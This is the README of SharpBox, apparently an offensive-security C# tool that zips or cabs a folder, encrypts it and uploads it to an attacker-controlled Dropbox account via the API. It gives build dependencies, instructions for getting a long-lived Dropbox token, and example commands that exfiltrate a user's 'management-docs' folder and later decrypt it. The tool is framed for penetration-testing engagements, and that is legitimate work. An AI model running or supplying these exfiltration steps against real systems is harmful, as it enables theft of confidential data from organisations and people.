# SharpBox
SharpBox is a C# tool for compressing, encrypting, and exfiltrating data to DropBox using the DropBox API. 

## Compiling
Target Framework: NET3.5

The libraries added via NuGet for this project were:

**-CommandLineParser.1.9.71**

**-Costura.Fody.1.6.2**

**-DotNetZip.1.11.0**

**-Fody.2.1.2**

**-MSFTCompressionCab.1.0.0**

## Usage
Log into your DropBox account and head over to the [DropBox developer API explorer](https://dropbox.github.io/dropbox-api-v2-explorer/#auth_token/from_oauth1) page and get an oauth access token by clicking "Get Token".
These access tokens do not expire, but you can revoke them.  So I would recommend revoking tokens after being used on engagments.

Example:

```
SharpBox.exe -f "C:\Users\JasonF\Documents\management-docs" -t "DROPBOX-OATH-ACCESS-TOKEN-HERE" -c "cab" -p "SecretPassword123!"
```

SharpBox can Cab or Zip a folder of items.  Cabbing tends to compress into smaller files than zip, but has a maximum limit of 2GB.  The compressed file is then encrypted and uploaded to dropbox.

```
SharpBox 1.0.0.0
Copyright c  2018

  -f, --path           Required. path to the folder you wish to compress the
                       contents of

  -o, --OutFile        Name of the compressed file

  -t, --dbxToken       Dropbox Access Token

  -h, --dbxPath        (Default: /test/data) path to dbx folder

  -c, --compression    this option lets you choose to zip or cab the folder

  -d, --decrypt        (Default: False) Choose this to decrypt a zip or cabbed
                       file previously encrypted by this tool.  Requires
                       original password argument.

  -p, --password       Required. Password to encrypt or decrypt a zipped or
                       cabbed file.

  --help               Display this help screen.
  ```
  
  Passwords must be >= 5 characters. 
  
  Once the compressed/encrypted file is downloaded from DropBox, you can use this tool to decrypt it as well. 
  
  Example: 
  
  ```
  SharpBox.exe -f "C:\Users\evilDude\Desktop\data" -o "decrypted-data.cab" -p "SecretPassword123!" -d
  ```
  
  
